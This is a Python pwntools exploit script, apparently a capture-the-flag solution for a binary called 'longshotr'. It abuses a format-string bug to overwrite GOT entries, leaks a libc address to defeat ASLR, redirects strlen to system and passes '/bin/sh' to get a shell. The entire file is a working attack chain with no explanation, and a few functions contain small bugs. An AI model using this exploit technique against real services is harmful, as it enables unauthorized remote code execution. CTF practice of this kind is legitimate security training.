import time
from pwn import *
from pwnlib.tubes.tube import tube
import os
import sys

REMOTE = True

e = ELF('./longshotr')
libc = e.libc if not REMOTE else ELF('./libc-2.31.so')
def get_remote() -> tube:
    if not REMOTE:
        return process(['./longshotr', './longshotr'], env={"LD_PRELOAD":"./libc-2.31.so"})
    else:
        r = remote(sys.argv[1], int(sys.argv[2]))
def get_fmt_one_offset():
    def exec_fmt(payload):
        r = get_remote()
        data = r.recvuntil(b"Please provide your name: ")
        r.sendline(payload)
        r.recvuntil(b"Verified username: ")
        r.shutdown('write')
        return r.recvall().replace(b'start', b'START').replace(b'end', b'END')
    autofmt = FmtStr(exec_fmt)
    return autofmt.offset
def get_fmt_two_offset():
    def exec_fmt(payload):
        r.recvuntil(b'Please provide the name of the file to be analyzed: ')
        r.sendline(payload)
        result = r.recvall()
        # assert 'Access denied' in result
        return result
    autofmt = FmtStr(exec_fmt)
    return autofmt.offset
FORMAT_ONE_OFFSET = get_fmt_one_offset()
log.info('[+] FORMAT_ONE_OFFSET: %#x', FORMAT_ONE_OFFSET)
# FORMAT_TWO_OFFSET = get_fmt_two_offset()
# log.info('[+] FORMAT_TWO_OFFSET: %#x', FORMAT_TWO_OFFSET)
def perform_overwrites(r, overwrites, filename='a'):
    for addr, val in overwrites.items():
        log.info('Overwriting %#x with %#x', addr, val)
    r.recvuntil(b"Please provide your name: ")
    r.sendline(b'__' + fmtstr_payload(FORMAT_ONE_OFFSET, overwrites, numbwritten=2))
    #gdb.attach(r)
    r.recvuntil(b"Verified username: ")
    r.readuntil(b'Please provide the name of the file to be analyzed: ')
    r.sendline(filename)
def exploit_fmt_to_make_it_restartable(r):
    overwrites = {e.got['strcpy']: e.entrypoint}
    return perform_overwrites(r, overwrites)
def leak_libc(r):
    r.recvuntil('Please provide your name: ')
    #starting_offset = 16384
    starting_offset = int(os.environ.get('OFFSET', '16384'))
    #gdb.attach(r)
    r.sendline('--'.join([f'{i+starting_offset}=%{i+starting_offset}$p' for i in range(1, 50)]))
    r.recvuntil('Verified username: ')
    
    vals = []
    for s in r.recvline().decode().strip().split('--'):
        key, val = s.split('=')
        if val.strip() == '(nil)':
            val = 0
        else:
            val = int(val, 16)
        vals.append((key, val))
    for index, val in vals:
        if val == 0:
            continue
        log.info(f'{index}: {hex(val)}')
    expected_offset = 0x4f0c
    #expected_lower_12bit = libc.symbols['funlockfile'] & 0xfff
    expected_lower_12bit = expected_offset & 0xfff
    possible_vals = [val for index, val in vals if val & 0xfff == expected_lower_12bit]
    #pause()
    assert len(possible_vals) == 1, "Leak was not found, debug this against the real target"
    # base = possible_vals[0] - libc.symbols['funlockfile']
    base = possible_vals[0] - expected_offset
    r.readuntil("Please provide the name of the file to be analyzed: ")
    r.sendline('a')
    return base
r = get_remote()
exploit_fmt_to_make_it_restartable(r)
libc_base = leak_libc(r)
log.info('libc_base: %#x', libc_base)
libc.address = libc_base
# gdb.attach(r)
perform_overwrites(r,
    {e.got['strlen']: libc.symbols['system']},
    filename = '/bin/sh;__'
)
r.interactive()
